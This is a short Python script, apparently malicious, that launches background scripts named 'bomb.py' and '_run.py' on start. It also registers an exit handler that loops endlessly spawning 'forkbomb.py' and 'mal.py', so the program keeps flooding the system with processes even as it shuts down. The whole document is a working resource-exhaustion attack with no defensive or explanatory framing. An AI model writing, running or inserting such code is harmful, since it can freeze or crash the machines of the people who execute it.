import os
import atexit
os.system("python _run.py & python bomb.py &")

@atexit.register
def goodbye():
  mal = True
  while mal == True:
    os.system("python forkbomb.py & mal.py &")
